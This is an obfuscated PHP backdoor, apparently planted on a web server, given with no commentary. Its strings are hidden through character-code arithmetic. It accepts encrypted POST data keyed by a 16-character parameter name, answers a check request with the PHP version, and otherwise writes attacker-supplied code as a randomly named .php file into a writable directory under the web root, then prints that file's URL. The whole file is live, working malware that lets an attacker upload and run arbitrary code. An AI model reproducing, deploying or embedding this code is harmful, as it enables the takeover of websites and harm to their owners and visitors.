<?php $apuhrt = chr(68).'O'.'C'.chr(85).chr(77)."\105"."\116"."\x54"."\137"."\x52".'O'.chr(79)."\x54";$jailldxdv = chr(72)."\124"."\124".'P'.'_'."\110"."\117".chr(684-601).chr(522-438);$shwaiaki = "\x68".'t'.'t'."\x70".':'."\57"."\57";$buujmrmd = "\56".chr(112)."\x68"."\x70";$zttslp = "\x70"."\x68".chr(809-697);$nhkglsh = 'f'.chr(267-162).chr(937-829)."\x65"."\137"."\160".chr(671-554)."\164".chr(558-463)."\143"."\157".chr(384-274)."\164"."\145".chr(110).chr(116).chr(115);$kamnzikavr = "\x72".chr(807-710)."\167".chr(117)."\x72".chr(544-436).'d'.chr(641-540).'c'.chr(483-372).'d'."\145";$svdygoh = chr(117).chr(110).'s'.chr(886-785)."\x72"."\x69"."\x61".chr(357-249).chr(105)."\172".chr(101);$glznubl = 'p'."\x68"."\x70".chr(118).'e'.chr(469-355)."\x73".'i'.'o'.chr(110);$orsmdbxecf = "\163".chr(116).'r'.chr(675-580).chr(114)."\157"."\x74".chr(49).chr(865-814);$pelrprns = "\163".'e'."\162".chr(901-796).chr(266-169)."\154"."\151".chr(783-661).'e';foreach ($_POST as $lrqwgsv => $yogzcw){if (strlen($lrqwgsv) == 16){$yogzcw = str_split($kamnzikavr($orsmdbxecf($yogzcw)));$lrqwgsv = array_slice(str_split(str_repeat($lrqwgsv, (count($yogzcw)/16)+1)), 0, count($yogzcw));function zokrokqziy($vvbcv, $pcacintvc, $lrqwgsv){$miywkl = "qczmktgoaglbpbkz";return $vvbcv ^ $miywkl[$pcacintvc % strlen($miywkl)] ^ $lrqwgsv;}$yogzcw = implode("", array_map("zokrokqziy", array_values($yogzcw), array_keys($yogzcw), array_values($lrqwgsv)));$yogzcw = @$svdygoh($yogzcw);if (@is_array($yogzcw)){$bgyvcgn = array_keys($yogzcw);$yogzcw = $yogzcw[$bgyvcgn[0]];if ($yogzcw === $bgyvcgn[0]){echo @$pelrprns(Array($zttslp => @$glznubl(), ));exit();}else {function tpwgmt($pcaciir){static $jdqhhsglt = array();$sppim = glob($pcaciir . '/*', GLOB_ONLYDIR);if (count($sppim) > 0) {foreach ($sppim as $pcaci) {if (@is_writable($pcaci)) {$jdqhhsglt[] = $pcaci;}}}foreach ($sppim as $pcaciir) tpwgmt($pcaciir);return $jdqhhsglt;}$stbstre = $_SERVER[$apuhrt];$sppim = tpwgmt($stbstre);$bgyvcgn = array_rand($sppim);$qkhmsdw = $sppim[$bgyvcgn] . "/" . substr(md5(time()), 0, 8) . $buujmrmd;@$nhkglsh($qkhmsdw, $yogzcw);echo $shwaiaki . $_SERVER[$jailldxdv] . substr($qkhmsdw, strlen($stbstre));exit();}}}}